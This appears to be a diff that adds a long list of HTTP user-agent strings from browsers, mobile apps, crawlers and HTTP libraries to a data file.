+Mozilla/5.0 (Linux; Android 7.1.2; Pixel Build/NHG47N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; STK-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (MSIE 9.0; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931
+Mozilla/5.0 (Linux; Android 9; SM-N950U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; M2010J19CI MIUI/V12.0.6.0.QJFINXM)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4550.0 Safari/537.36
+Microsoft Office Excel 2013
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; ms-office)
+Mozilla/5.0 (Linux; Android 11; SM-M515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+Mozilla/5.0 (compatible; oBot/2.3.1;  http://filterdb.iss.net/crawler/)
+Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm
+Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; SM-G925T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925T Build/LMY47X)
+Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; RMX1851 Build/QKQ1.190918.001)
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/119.0.324025186 Mobile/18A373 Safari/604.1
+Mozilla/5.0 (Linux; Android 11; Pixel 3 Build/RQ3A.210605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 YaBrowser/21.3.2.187 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.2 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T231 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36
+l9tcpid/v1.1.0
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.2777.70 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36  Chrome Generic
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-T515) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-T290 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 GSA/12.24.10.23.arm64
+Java/1.8.0_292
+Dalvik/2.1.0 (Linux; U; Android 11; M2101K7AI Build/RKQ1.201022.002)
+Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
+Apache-HttpClient/4.5.13 (Java/11.0.11)
+facebookexternalhit/1.1; kakaotalk-scrap/1.0;  https://devtalk.kakao.com/t/scrap/33984
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/165.0.379198085 Mobile/18B92 Safari/604.1
+Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
+RubyBrowser/46.3.23 (iPhone; iOS 14.6; Scale/3.00)
+Mozilla/5.0 (Linux; Android 10; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; HTV33) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; Infinix X655) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.69 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-N986B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10
+Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/538.1 (KHTML, like Gecko) fancybrowser Safari/538.1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.34 (KHTML, like Gecko) demobrowser/0.1 Safari/534.34
+Dalvik/2.1.0 (Linux; U; Android 10; MI 9 MIUI/V12.0.5.0.QFAEUXM)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; ja-jp) AppleWebKit/525.26.2 (KHTML, like Gecko) Version/3.2 Safari/525.26.12
+Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.17) Gecko/20080919 K-Meleon/1.5.1
+Mozilla/5.0 (Linux; Android 8.0.0; HTC Desire 12 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.4.610 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; SM-T550 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 GSA/12.24.10.23.arm
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; GIONEE_MAX Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.228
+Mozilla/5.0 (Linux; Android 11; CPH2001 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (X11; CrOS x86_64 13597.94.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.186 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/73.0.3683.68 Mobile/15E148 Safari/605.1
+AndroidDownloadManager/9 (Linux; U; Android 9; ZTE Blade A7 2019 Build/PPR1.180610.011)
+com.google.android.apps.searchlite/484573 (Linux; U; Android 8.1.0; es_US; SM-J410G; Build/M1AJB; Cronet/90.0.4430.210)
+Mozilla/5.0 (Linux; Android 11; SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3170.105 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.107 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.2; SM-N9005 Build/ORG.08) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.208
+Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 635) like Gecko
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; GWX:QUALIFIED)
+Dalvik/2.1.0 (Linux; U; Android 11; SM-A515F Build/RP1A.200720.012)
+Mozilla/5.0 (Linux; Android 10; SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.5 Safari/537.36
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.2.28630)
+Iframely/1.3.1 ( https://iframely.com/docs/about)
+Mozilla/4.8 [en] (Windows NT 5.1; U)
+Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2858.12 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2319.45 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+VPNGate/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.14 Safari/537.36 OPR/17.0.1246.0 (Edition C8F79CB05)
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2891.0 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 11; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A516N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.35 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-A705GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64
+Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080722 Firefox/2.0.0.16
+Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.1) Gecko/20090703 Firefox/3.5
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4564.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-G781B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N976U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-T510 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 GSA/12.25.10.23.arm
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; AC2001 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)
+Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4083.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2451.51 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; CPH1717) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; TECNO IN2 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 GSA/12.24.10.23.arm
+Mozilla/5.0 (Linux; Android 10; SM-A025AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; LDN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15; rv:89.0) Gecko/20100101 Firefox/89.0
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:88.0) Gecko/20100101 Firefox/88.0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3029.57 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203 (Edition computer_bild)
+Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3
+Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)
+Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+WebCopier v4.6
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4563.0 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3520.77 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&Win32
+Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2257.14 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.50 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0; AGS-L09 Build/HUAWEIAGS-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/166.0.381336632 Mobile/18D70 Safari/604.1 OcIdWebView ({"os":"iOS","appVersion":"166.0.381336632","app":"com.google.GoogleMobile","osVersion":"14.4.2","style":2,"isDarkTheme":true,"libraryVersion":"1.21.02.1","zoom":1})
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2715.149 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3040.31 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2961.10 Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0
+Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4427.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; M2006C3MI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4568.0 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+com.google.android.apps.searchlite/444787 (Linux; U; Android 10; en_US; TECNO KD6; Build/QP1A.190711.020; Cronet/90.0.4430.210)
+Mozilla/5.0 (Linux; Android 10; TECNO KD6 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.7(0x18000731) NetType/WIFI Language/zh_CN
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Mozilla/5.0 (X11; CrOS aarch64 13904.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.147 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3493.43 Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; MotoG3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; CPH2059 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Mozilla/5.0 (Linux; Android 8.0.0; SM-J810Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.2607.175 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36    Chrome Generic
+Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/165.0.379198085 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 11; RMX2170 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+WhatsApp/2.2126.11 N
+Dalvik/2.1.0 (Linux; U; Android 10; CPH2095 Build/QKQ1.200614.002)
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36 OPR/77.0.4054.90 (Edition 360)
+Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1801) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/2.0.7 Chrome/83.0.4103.96 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; LM-G820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ONEPLUS A6010 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.19 SP-engine/2.15.0 baiduboxapp/11.19.5.10 (Baidu; P1 10)
+Mozilla/5.0 (Linux; Android 11; SM-G781U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/320.1.0.46.121;FBBV/303197950;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0]
+Safari/14606.1.36.1.9 CFNetwork/974.1 Darwin/18.0.0 (x86_64)
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3766.400 QQBrowser/10.6.4163.400
+0
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; WOW64; Trident/5.0)
+WhatsApp/2.21.6.17 A
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3867.400 QQBrowser/10.7.4315.400
+WhatsApp/2.21.14.6 A
+WhatsApp/2.2126.10 N
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:62.0) Gecko/20100101 Firefox/62.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; Lenovo TB-8505FS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
+Mozilla/5.0 (X11; FreeBSD amd64; rv:89.0) Gecko/20100101 Firefox/89.0
+Mozilla/5.0 (Linux; Android 10; SM-A9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
